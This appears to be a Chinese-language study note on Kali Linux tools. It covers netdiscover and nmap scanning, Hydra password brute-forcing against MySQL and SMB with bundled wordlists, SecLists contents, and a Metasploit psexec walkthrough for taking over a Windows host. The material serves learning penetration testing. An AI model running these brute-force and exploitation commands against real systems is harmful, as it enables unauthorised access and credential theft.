---
title: 2.kali工具使用
date: 2026-10-08 17:24:23
tags: [网络安全]
---
# Netdiscover 网络扫描工具
网络扫描工具,通过ARP扫描发现活动主机,可以通过被动和主动两种模式进行ARP扫描(可以扫描出什么设备连接什么网络)
通过主动发送ARP请求检查网络ARP流量,通过自动扫描模式扫描网络地,这种扫描的方式在内网不容易被别人发现


## 1.基础扫描 -搜索同一网段的主机
```
sudo netdiscover -r 192.168.41.0/24
```
<!--more-->

# nmap 端口扫描
端口扫描工具

## 1.基础扫描 -扫描该ip暴露的端口
```
nmap 192.168.1.23 -O

# 全端口漏洞扫描
nmap -sV -p- --script vuln 192.168.1.183

# 服务版本探测 + 操作系统识别
sudo nmap -sV -O -p 80,135,139,445,3306,3389,50000 192.168.1.183
进一步获取相关软件服务的版本号

```
| 参数 | 格式 | 用途 |
|------|------|------|
| `-oN` | 普通文本 | 人类可读，和终端显示一致 |
| `-oX` | XML | 机器可读，可导入其他工具或转 HTML |
| `-oG` | Grep 格式 | 每行一个目标，方便 grep/awk 提取 |
| `-oA` | 全部格式 | 同时输出以上三种，最推荐 |


# Hydra 暴力破解
主要用于执行包里破解攻击.它能够自动尝试多种用户名和密码组合
支持多种协议和服务,如http ftp ssh smb mysql 等
```
简单指令:
小写L: 直接账号密码
大写L: 使用字典

hydra -L (账号字典) -P (密码字典) ip 协议(比如 mysql)
hydra -l 账号 -P 密码 ip 协议(比如 mysql)

hydra -l root -p yourpass --t 16 127.0.0.1 mysql

空密码 -e n
hydra -l administrator -p yourpass -e nsr -t 16 127.0.0.1 smbnt

反转密码 r
hydra -l admin -p yourpass -er  -s 3306 -t 16 127.0.0.1 mysql
``` 
| 参数 | 说明 |
|------|------|
| `-l` | 指定单个用户名 |
| `-L` | 指定用户名字典文件 |
| `-p` | 指定单个密码 |
| `-P` | 指定密码字典文件 |
| `-C` | 指定"用户名:密码"格式字典 |
| `-t` | 设置线程数（默认16） |
| `-s` | 指定非默认端口 |
| `-f` | 找到一个密码就停止 |
| `-o` | 将结果保存到文件 |
| `-vV` | 显示详细过程 |
| `-M` | 指定多个目标主机文件 |
| `-e nsr` | 额外尝试：空密码/用户名作密码/用户名倒序 |

-   **Nuclei**：基于模板的漏洞扫描器，模板库会频繁更新，执行 `nuclei -update-templates` 即可拉取最新 CVE 检测模板

# wordlists 密码本
kali自带的字典
 ```
 rockyou.txt 全量密码
 
 ```
##  1.1  密码爆破字典
| 字典 | 实际路径 | 说明 |
| :--- | :--- | :--- |
| rockyou.txt.gz | 同目录（需解压） | 最经典，1400万+真实泄露密码，适用于几乎所有暴力破解场景 |
| john.lst | `/usr/share/john/password.lst` | John the Ripper 自带字典，适合离线密码哈希破解 |
| fasttrack.txt | `/usr/share/set/src/fasttrack/wordlist.txt` | Social-Engineer Toolkit 的字典，侧重常见弱口令 |
| nmap.lst | `/usr/share/nmap/nselib/data/passwords.lst` | Nmap 脚本使用的密码字典 |
| metasploit | `/usr/share/metasploit-framework/data/wordlists/` | 按系统分类（Unix/Windows），适合定向爆破 |
##  1.2 web目录枚举类字典
| 字典 | 实际路径 | 说明 |
| :--- | :--- | :--- |
| dirb | `/usr/share/dirb/wordlists` | 包含 `common.txt`、`big.txt` 等，Web 目录爆破首选 |
| dirbuster | `/usr/share/dirbuster/wordlists` | DirBuster 专用，含 `directory-list-2.3-medium.txt` 等 |
| wfuzz | `/usr/share/wfuzz/wordlist` | wfuzz 模糊测试专用字典 |
| sqlmap.txt | `/usr/share/sqlmap/data/txt/wordlist.txt` | SQLMap 注入测试使用的字典 |
## 1.3  网络/其他类字典
| 字典 | 实际路径 | 说明 |
| :--- | :--- | :--- |
| dnsmap.txt | `/usr/share/dnsmap/wordlist_TLAs.txt` | DNS 子域名枚举用的三字母缩写字典 |
| fern-wifi | `/usr/share/fern-wifi-cracker/extras/wordlists` | Wi-Fi 密码破解专用字典 |
| wifite.txt | `/usr/share/dict/wordlist-probable.txt` | Wi-Fi 渗透常用的高频密码字典 |
| legion | `/usr/share/legion/wordlists` | Legion 自动化渗透框架的字典 |
```
# 用 metasploit 的 Windows 专用密码字典
hydra -l administrator -P /usr/share/metasploit-framework/data/wordlists/windows_passwords.txt 192.168.1.183 smbnt
```
## 1.4 **字典不够用时，安装 SecLists**
  ```
SecLists 是目前最全面的渗透测试字典集合，覆盖密码、用户名、Web路径、子域名等：

sudo apt update && sudo apt install seclists -y

安装后字典位于 `/usr/share/seclists/`，内容远比内置字典丰富。

```
| 目录 | 用途 | 典型场景 |
| :--- | :--- | :--- |
| Discovery | 子域名、目录、DNS 枚举 | Web 路径爆破、子域名枚举 |
| Fuzzing | 模糊测试 payload | SQL注入、XSS、命令注入测试 |
| Miscellaneous | 杂项字典 | 特殊用途 |
| Passwords | 密码字典 | 暴力破解（SMB/SSH/FTP等） |
| Pattern-Matching | 正则匹配模式 | 信息提取、数据清洗 |
| Payloads | 漏洞利用 payload | RCE、文件上传、反序列化 |
| Usernames | 用户名字典 | 用户名枚举/爆破 |
| Web-Shells | Web 后门 | 获取 Webshell 时使用 |

# 渗透工具  Metasploit Framework
Metasploit Framework是一个广泛使用的开源渗透测试平台,
提供了强大的工具来识别 验证和利用系统中的漏洞 .
它被设计为一个模块化的框架,允许用户轻松地加载 配置和执行各种攻击模块,以便在目标系统上测试和模拟真实世界中的攻击场景

```
框架路径: /usr/share/metasploit-framework

1.启动Metasploit:
  msfconsole
  更新:
  msfupdate
  
  
2.搜索漏洞模块:
  search [关键词]

3.使用漏洞模块:
  选择搜索出来的序号
  use [模块名] 

4.漏洞配置项
  options

5.设置配置项:
   set RHOSTS [目标IP]
   set RPORT [目标端口]

6. 执行攻击:
   exploit
   
```

例如:
```
使用MSF 中给的 psexec模块 smb的漏洞 开启对方系统的远程桌面功能

use exploit/windows/smb/psexec

set rhost 192.168.41.132
set smbpass password
set smbuser Adminisrtator

run

侵入成功后 可在cmd执行命令 比如打开3389端口 进行远程桌面
```

